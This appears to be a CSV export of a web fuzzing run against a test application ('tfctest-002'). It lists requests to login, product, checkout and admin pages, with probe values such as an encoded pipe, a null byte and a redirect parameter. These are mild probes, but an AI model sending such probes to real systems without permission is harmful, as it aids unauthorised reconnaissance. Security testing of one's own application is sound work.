ID,Req. Timestamp,Resp. Timestamp,Method,URL,Code,Reason,RTT,Size Resp. Header,Size Resp. Body
5383,Mon Sep 07 03:11:48 BDT 2026,Mon Sep 07 03:11:49 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?_rsc=%7C,200,OK,523,429,1033
5384,Mon Sep 07 03:11:48 BDT 2026,Mon Sep 07 03:11:49 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/10?_rsc=%40,200,OK,523,429,1101
5385,Mon Sep 07 03:11:48 BDT 2026,Mon Sep 07 03:11:49 BDT 2026,GET,https://tfctest-002-production.up.railway.app/checkout?_rsc=%7C,200,OK,679,429,1036
5386,Mon Sep 07 03:11:49 BDT 2026,Mon Sep 07 03:11:49 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%2Fcheckout&=,200,OK,515,428,284
5387,Mon Sep 07 03:11:49 BDT 2026,Mon Sep 07 03:11:50 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/3?_rsc=tXyZJ52UQVBCVsD3,200,OK,513,429,1100
5388,Mon Sep 07 03:11:49 BDT 2026,Mon Sep 07 03:11:49 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/1?_rsc=%2B,200,OK,533,429,1100
5389,Mon Sep 07 03:11:49 BDT 2026,Mon Sep 07 03:11:49 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%2B,200,OK,525,428,274
5390,Mon Sep 07 03:11:49 BDT 2026,Mon Sep 07 03:11:49 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/2?_rsc=%2B,200,OK,509,429,1100
5391,Mon Sep 07 03:11:49 BDT 2026,Mon Sep 07 03:11:49 BDT 2026,GET,https://tfctest-002-production.up.railway.app/admin?_rsc=%00,200,OK,861,429,1033
5392,Mon Sep 07 03:11:49 BDT 2026,Mon Sep 07 03:11:50 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/10?_rsc=%2B,200,OK,502,429,1101
5393,Mon Sep 07 03:11:50 BDT 2026,Mon Sep 07 03:11:50 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/4?_rsc=tXyZJ52UQVBCVsD3,200,OK,534,429,1100
